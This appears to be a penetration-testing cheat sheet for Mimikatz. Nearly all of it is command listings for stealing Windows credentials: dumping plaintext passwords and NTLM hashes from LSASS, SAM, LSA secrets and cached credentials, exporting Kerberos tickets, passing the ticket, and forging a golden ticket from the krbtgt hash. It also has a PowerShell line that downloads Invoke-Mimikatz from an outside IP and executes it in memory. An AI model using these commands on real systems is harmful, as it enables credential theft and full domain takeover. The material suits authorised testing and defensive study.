Mimikatz can extract credential data from memory or disk password stores, including plaintext passwords, pins, Kerberos tickets, and NTLM password hashes.

Source 
```
https://github.com/gentilkiwi/mimikatz/release
```

if you don't run mimikatz as an administrator, mimikatz will not run properly

```ls


#Export Tickets Use /export
#Always try /patch and /inject  in LSA dump sDifferenct technique of the attack

#The debug privilege allows you to debug and tune the memory of a process owned by another user account  a necessary step for extracting plaintext passwords from LSASS.

privilege::debug

#writes a log file
log

# dumps local security authority logon sessions
lsadump::lsa
lsadump::lsa /inject


#record all users who have recently logged into the system
#NTLM and SHA1 password hashes cracked to reveal  uses pass

sekurlsa::logonpasswords


#To export credentials stored in the SAM database, you must first upgrade your privileges from Administrator to system. which are necessary to extract data from the SAM database.
token::elevate


#dump SAM hashes
lsadump::sam 

#dump lsa secret
lsadump::secrets

#dump cached credentials
lsadump::cache



#extract tickets
sekurlsa::tickets /export

#pass the ticket 
kerberso::ptt  <savedFile>

#To Dump hash  and SID of the krbtgt 
lsadump::lsa /inject /name:krbtgt



#allInone
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"

#retrieve all the available Kerberos tickets
kerberos::list

#List the ticket that has been submitted for the current user session
kerberos::tgt

#list of all Kerberos tickets stored in system memory
sekurlsa::tickets

#ticket was generated with NTLM hash of the **krbtgt** account Kerberos will trust the ticket by default and therefore any user valid or invalid regardless of their privileges

#This will open a new command prompt with elevated privileges to all machines.
misc::cmd

#Pass-the-Ticket
kerberos::ptt
```

Another data store from which you can extract credentials is the LSA and SAM databases.

`lsadump` has one command to extract data from the LSA

A forged **Golden ticke**t can be created with Mimikatz by using the obtained information.

```sh
kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt

#Note: you may need to change the “ /Krbtgt:” to “/rc4:”. if you encountered any errors follow this official guide.
```

**Mimikatz Via Powershell**

Source
```
https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1
```

```sh
iex (iwr -UseBasicParsing http://10.11.103.226/Invoke-Mimikatz.ps1)

#Example Command 
Invoke-Mimikatz -Command '"token::elevate"'
```

### Reference 
- https://medium.com/@redfanatic7/detailed-mimikatz-guide-87176fd526c0